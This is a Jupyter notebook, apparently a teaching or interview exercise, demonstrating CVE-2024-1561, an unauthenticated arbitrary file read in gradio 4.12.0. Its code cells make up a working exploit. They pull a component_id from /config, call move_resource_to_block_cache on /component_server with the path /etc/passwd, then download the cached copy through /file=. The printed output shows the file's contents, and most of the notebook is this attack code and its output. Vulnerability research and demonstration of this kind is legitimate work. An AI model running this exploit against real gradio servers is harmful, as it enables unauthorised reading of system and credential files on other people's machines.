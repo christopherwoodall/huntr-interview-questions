{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# gradio 4.12.0 LFI Demo - CVE-2024-1561\n",
    "\n",
    "Report: https://huntr.com/bounties/4acf584e-2fe8-490e-878d-2d9bf2698338\n",
    "\n",
    "### Description\n",
    "This is a vulnerability in the `gradio` package that allows an attacker to read arbitrary files on the system by sending a crafted HTTP request to the server.\n",
    "\n",
    "The [`move_resource_to_block_cache()`](https://github.com/gradio-app/gradio/blob/227221f88755240798ca2071bd1a0d165f5a82e7/gradio/processing_utils.py#L228) is used to move a resource to the cache.\n",
    " \n",
    "\n",
    "### CVE Rating\n",
    "This vulnerability has been rated as a `High` severity issue because of the following factors:\n",
    "  - The vulnerability allows an attacker to read arbitrary files on the system.\n",
    "  - The vulnerability can be exploited remotely by sending a crafted HTTP request to the server.\n",
    "  - The vulnerability can be exploited without authentication.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [],
   "source": [
    "import json\n",
    "\n",
    "import http.client\n",
    "import urllib.parse\n",
    "\n",
    "def post_request(conn, endpoint, payload, headers):\n",
    "  conn.request(\"POST\", endpoint, body=payload, headers=headers)\n",
    "  response = conn.getresponse()\n",
    "  response_data = response.read().decode()\n",
    "  return {\"status\": response.status, \"data\": response_data}\n",
    "\n",
    "\n",
    "def get_request(conn, payload):\n",
    "  conn.request(\"GET\", payload)\n",
    "  response = conn.getresponse()\n",
    "  response_data = response.read().decode()\n",
    "  return {\"status\": response.status, \"data\": response_data}\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "  server = \"127.0.0.1\"\n",
    "  port = 7860\n",
    "  target_file = \"/etc/passwd\"\n",
    "\n",
    "  component_id = \"\"\n",
    "  cached_file_path = \"\"\n",
    "\n",
    "  conn = http.client.HTTPConnection(server, port)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "In this step we query the `/config` endpoint in order to extract a valid `component_id` that will be used in subsequent requests."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Setup - Retrieve application configuration\n",
      "Status: 200\n",
      "Response data: {\"version\":\"4.12.0\",\"mode\":\"interface\",\"app_id\":976238203326189221,\"dev_mode\":false,\"analytics_enabled\":true,\"components\":[{\"id\":3,\"type\":\"row\",\"props\":{\"variant\":\"default\",\"visible\":true,\"equal_height\":false,\"name\":\"row\"},\"skip_api\":true,\"component_class_id\":\"58f59d1caa4b63161ae89f53fb1ea3e9\"},{\"id\":4,\"type\":\"column\",\"props\":{\"scale\":1,\"min_width\":320,\"variant\":\"panel\",\"visible\":true,\"name\":\"column\"},\"skip_api\":true,\"component_class_id\":\"73b3a7d60a2ccce94d4900e01c75247c\"},{\"id\":5,\"type\":\"column\",\"props\":{\"scale\":1,\"min_width\":320,\"variant\":\"default\",\"visible\":true,\"name\":\"column\"},\"skip_api\":true,\"component_class_id\":\"73b3a7d60a2ccce94d4900e01c75247c\"},{\"id\":1,\"type\":\"textbox\",\"props\":{\"value\":\"\",\"lines\":1,\"max_lines\":20,\"label\":\"name\",\"show_label\":true,\"container\":true,\"min_width\":160,\"visible\":true,\"autofocus\":false,\"autoscroll\":true,\"elem_classes\":[],\"type\":\"text\",\"rtl\":false,\"show_copy_button\":false,\"name\":\"textbox\",\"_selectable\":false},\"skip_api\":false,\"component_class_id\":\"3dbcbede1deda3e92adb8f07f3f93792\",\"api_info\":{\"type\":\"string\"},\"example_inputs\":\"Hello!!\"},{\"id\":6,\"type\":\"form\",\"props\":{\"scale\":0,\"min_width\":0,\"name\":\"form\"},\"skip_api\":true,\"component_class_id\":\"6b27d618eebbcdddb5d84ac543e5ab5b\"},{\"id\":7,\"type\":\"row\",\"props\":{\"variant\":\"default\",\"visible\":true,\"equal_height\":true,\"name\":\"row\"},\"skip_api\":true,\"component_class_id\":\"58f59d1caa4b63161ae89f53fb1ea3e9\"},{\"id\":8,\"type\":\"button\",\"props\":{\"value\":\"Clear\",\"variant\":\"secondary\",\"visible\":true,\"interactive\":true,\"elem_classes\":[],\"show_api\":false,\"name\":\"button\",\"_selectable\":false},\"skip_api\":true,\"component_class_id\":\"67b70c2b3d0c6e02ae02897676b082d7\"},{\"id\":9,\"type\":\"button\",\"props\":{\"value\":\"Submit\",\"variant\":\"primary\",\"visible\":true,\"interactive\":true,\"elem_classes\":[],\"name\":\"button\",\"_selectable\":false},\"skip_api\":true,\"component_class_id\":\"089297e7fee3574c50894d2f697fddc7\"},{\"id\":10,\"type\":\"column\",\"props\":{\"scale\":1,\"min_width\":320,\"variant\":\"panel\",\"visible\":true,\"name\":\"column\"},\"skip_api\":true,\"component_class_id\":\"73b3a7d60a2ccce94d4900e01c75247c\"},{\"id\":2,\"type\":\"textbox\",\"props\":{\"value\":\"\",\"lines\":1,\"max_lines\":20,\"label\":\"output\",\"show_label\":true,\"container\":true,\"min_width\":160,\"interactive\":false,\"visible\":true,\"autofocus\":false,\"autoscroll\":true,\"elem_classes\":[],\"type\":\"text\",\"rtl\":false,\"show_copy_button\":false,\"name\":\"textbox\",\"_selectable\":false},\"skip_api\":false,\"component_class_id\":\"3dbcbede1deda3e92adb8f07f3f93792\",\"api_info\":{\"type\":\"string\"},\"example_inputs\":\"Hello!!\"},{\"id\":11,\"type\":\"row\",\"props\":{\"variant\":\"default\",\"visible\":true,\"equal_height\":true,\"name\":\"row\"},\"skip_api\":true,\"component_class_id\":\"58f59d1caa4b63161ae89f53fb1ea3e9\"},{\"id\":12,\"type\":\"button\",\"props\":{\"value\":\"Flag\",\"variant\":\"secondary\",\"visible\":true,\"interactive\":true,\"elem_classes\":[],\"name\":\"button\",\"_selectable\":false},\"skip_api\":true,\"component_class_id\":\"089297e7fee3574c50894d2f697fddc7\"},{\"id\":13,\"type\":\"form\",\"props\":{\"scale\":0,\"min_width\":0,\"name\":\"form\"},\"skip_api\":true,\"component_class_id\":\"6b27d618eebbcdddb5d84ac543e5ab5b\"}],\"css\":null,\"js\":null,\"head\":null,\"title\":\"Gradio\",\"space_id\":null,\"enable_queue\":true,\"show_error\":false,\"show_api\":true,\"is_colab\":false,\"stylesheets\":[\"https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;600&display=swap\",\"https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&display=swap\"],\"theme\":\"default\",\"protocol\":\"sse_v1\",\"layout\":{\"id\":0,\"children\":[{\"id\":3,\"children\":[{\"id\":4,\"children\":[{\"id\":5,\"children\":[{\"id\":6,\"children\":[{\"id\":1}]}]},{\"id\":7,\"children\":[{\"id\":8},{\"id\":9}]}]},{\"id\":10,\"children\":[{\"id\":13,\"children\":[{\"id\":2}]},{\"id\":11,\"children\":[{\"id\":12}]}]}]}]},\"dependencies\":[{\"targets\":[[9,\"click\"],[1,\"submit\"]],\"inputs\":[1],\"outputs\":[2],\"backend_fn\":true,\"js\":null,\"queue\":null,\"api_name\":\"predict\",\"scroll_to_output\":true,\"show_progress\":\"full\",\"every\":null,\"batch\":false,\"max_batch_size\":4,\"cancels\":[],\"types\":{\"continuous\":false,\"generator\":false},\"collects_event_data\":false,\"trigger_after\":null,\"trigger_only_on_success\":false,\"trigger_mode\":\"once\",\"show_api\":true},{\"targets\":[[8,\"click\"]],\"inputs\":[],\"outputs\":[1,2],\"backend_fn\":false,\"js\":\"() => [null, null]\",\"queue\":false,\"api_name\":\"js_fn\",\"scroll_to_output\":false,\"show_progress\":\"full\",\"every\":null,\"batch\":false,\"max_batch_size\":4,\"cancels\":[],\"types\":{\"continuous\":false,\"generator\":false},\"collects_event_data\":false,\"trigger_after\":null,\"trigger_only_on_success\":false,\"trigger_mode\":\"once\",\"show_api\":false},{\"targets\":[[8,\"click\"]],\"inputs\":[],\"outputs\":[5],\"backend_fn\":false,\"js\":\"() => [{\\\"variant\\\": null, \\\"visible\\\": true, \\\"__type__\\\": \\\"update\\\"}]\\n            \",\"queue\":false,\"api_name\":\"js_fn_1\",\"scroll_to_output\":false,\"show_progress\":\"full\",\"every\":null,\"batch\":false,\"max_batch_size\":4,\"cancels\":[],\"types\":{\"continuous\":false,\"generator\":false},\"collects_event_data\":false,\"trigger_after\":null,\"trigger_only_on_success\":false,\"trigger_mode\":\"once\",\"show_api\":false},{\"targets\":[[12,\"click\"]],\"inputs\":[],\"outputs\":[12],\"backend_fn\":true,\"js\":null,\"queue\":false,\"api_name\":\"lambda\",\"scroll_to_output\":false,\"show_progress\":\"full\",\"every\":null,\"batch\":false,\"max_batch_size\":4,\"cancels\":[],\"types\":{\"continuous\":false,\"generator\":false},\"collects_event_data\":false,\"trigger_after\":null,\"trigger_only_on_success\":false,\"trigger_mode\":\"once\",\"show_api\":false},{\"targets\":[[12,\"click\"]],\"inputs\":[1,2],\"outputs\":[12],\"backend_fn\":true,\"js\":null,\"queue\":false,\"api_name\":\"Flag\",\"scroll_to_output\":false,\"show_progress\":\"full\",\"every\":null,\"batch\":false,\"max_batch_size\":4,\"cancels\":[],\"types\":{\"continuous\":false,\"generator\":false},\"collects_event_data\":false,\"trigger_after\":null,\"trigger_only_on_success\":false,\"trigger_mode\":\"once\",\"show_api\":false},{\"targets\":[[8,\"click\"]],\"inputs\":[],\"outputs\":[12],\"backend_fn\":true,\"js\":null,\"queue\":false,\"api_name\":\"reset\",\"scroll_to_output\":false,\"show_progress\":\"full\",\"every\":null,\"batch\":false,\"max_batch_size\":4,\"cancels\":[],\"types\":{\"continuous\":false,\"generator\":false},\"collects_event_data\":false,\"trigger_after\":null,\"trigger_only_on_success\":false,\"trigger_mode\":\"once\",\"show_api\":false}],\"root\":\"\"}\n",
      "Component ID: 3\n"
     ]
    }
   ],
   "source": [
    "payload = f\"/config\"\n",
    "response = get_request(conn, payload)\n",
    "\n",
    "# Extract a valid `component_id`\n",
    "component_id = json.loads(response[\"data\"])[\"components\"][0][\"id\"]\n",
    "\n",
    "print(\"Setup - Retrieve application configuration\")\n",
    "print(\"Status:\", response[\"status\"])\n",
    "print(\"Response data:\", response[\"data\"])\n",
    "print(f\"Component ID: {component_id}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The next step is to call the vulnerable method- `move_resource_to_block_cache()`- with a valid `component_id` and a crafted `data` path that will allow us to read arbitrary files on the system."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SETUP - Move resource to block cache\n",
      "Status: 200\n",
      "Response data: \"/tmp/gradio/2df5cd2c2d65b3af410e85b09be6493c63a189cb/passwd\"\n",
      "Cached file path: /tmp/gradio/2df5cd2c2d65b3af410e85b09be6493c63a189cb/passwd\n"
     ]
    }
   ],
   "source": [
    "api_endpoint = \"/component_server\"\n",
    "payload = json.dumps({\n",
    "  \"component_id\" : component_id,\n",
    "  \"data\" : target_file,\n",
    "  \"fn_name\" : \"move_resource_to_block_cache\",\n",
    "  \"session_hash\" : \"aaaaaaaaaaa\"\n",
    "})\n",
    "headers = {\"Content-Type\": \"application/json\"}\n",
    "\n",
    "response = post_request(conn, api_endpoint, payload, headers)\n",
    "\n",
    "# Extract the newly created cache path\n",
    "cached_file_path = response[\"data\"].strip('\"')\n",
    "\n",
    "print(\"SETUP - Move resource to block cache\")\n",
    "print(\"Status:\", response[\"status\"])\n",
    "print(\"Response data:\", response[\"data\"])\n",
    "print(f\"Cached file path: {cached_file_path}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Finally we read the contents of the cached file."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PAYLOAD - Read secrets\n",
      "Status: 200\n",
      "Response data: root:x:0:0:root:/root:/bin/bash\n",
      "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
      "bin:x:2:2:bin:/bin:/usr/sbin/nologin\n",
      "sys:x:3:3:sys:/dev:/usr/sbin/nologin\n",
      "sync:x:4:65534:sync:/bin:/bin/sync\n",
      "games:x:5:60:games:/usr/games:/usr/sbin/nologin\n",
      "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n",
      "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n",
      "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n",
      "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n",
      "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n",
      "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n",
      "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n",
      "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n",
      "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n",
      "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n",
      "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n",
      "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n",
      "_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n",
      "systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n",
      "systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n",
      "messagebus:x:103:104::/nonexistent:/usr/sbin/nologin\n",
      "systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n",
      "\n"
     ]
    }
   ],
   "source": [
    "payload = f\"/file={cached_file_path}\"\n",
    "response = get_request(conn, payload)\n",
    "\n",
    "print(\"PAYLOAD - Read secrets\")\n",
    "print(\"Status:\", response[\"status\"])\n",
    "print(\"Response data:\", response[\"data\"])"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
